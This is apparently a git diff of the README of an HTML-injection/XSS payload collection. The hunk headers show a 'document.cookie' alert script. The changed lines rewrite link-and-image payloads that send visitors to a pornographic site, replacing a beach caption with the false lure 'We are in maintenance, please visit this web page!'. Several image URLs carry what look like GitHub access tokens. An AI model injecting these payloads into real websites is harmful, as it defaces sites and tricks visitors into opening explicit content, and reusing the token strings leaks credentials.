@@ -57,35 +57,35 @@ nu11secur1ty<script>alert(document.cookie)</script>
 - 0.5 - Stupid Reflected
 ```
 <a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
-<img src="https://th.bing.com/th/id/OIP.oiIYrhY78i7grK52ZoHsJAHaEH?pid=ImgDet&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://th.bing.com/th/id/OIP.oiIYrhY78i7grK52ZoHsJAHaEH?pid=ImgDet&rs=1" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 </a>
 ```
 
 - 0.5.1 - Stupid Reflected
 ```
 <a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
-<img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif?token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif?token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 </a>
 ```
 
 - 0.5.3 - Stupid Reflected
 ```
 <a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
-<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 </a>
 ```
 
 - 0.5.4 - Stupid Reflected blow 0ut
 ```
 <a href="https://www.pornhub.com/view_video.php?viewkey=ph61f4241e1d586" target="_blank" rel="noopener nofollow ugc">
-<img src="https://dl.phncdn.com/gif/41165761.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://dl.phncdn.com/gif/41165761.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 </a>
 ```
 
 - 1.4.0 - size 10%, Stupid Reflected
 ```
 <a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
-<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:10%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:10%;" alt="We are in maintenance, please visit this web page!">
 </a>
 ```
 
@@ -93,13 +93,13 @@ nu11secur1ty<script>alert(document.cookie)</script>
 - 00
 ```
 <a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
-<img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 </a>
 ```
 ## Shame on you BLOW
 ```
 <a href="https://dl.phncdn.com/gif/41165761.gif" target="_blank" rel="noopener nofollow ugc">
-<img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 ```
 - 01
 ```
@@ -123,13 +123,13 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ## chalg@4
 ```js
 <a href="https://www.youtube.com/watch?v=yPuC4Cy2ZuI" target="_blank" rel="noopener nofollow ugc">
-<img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 ```
 
 ## chalg@4 0ut
 ```js
 <a href="https://www.youtube.com/watch?v=yPuC4Cy2ZuI" target="_blank" rel="noopener nofollow ugc">
-<img src="https://i.makeagif.com/media/4-26-2015/6XX5F7.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+<img src="https://i.makeagif.com/media/4-26-2015/6XX5F7.gif" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
 ```
 
 ## Error check
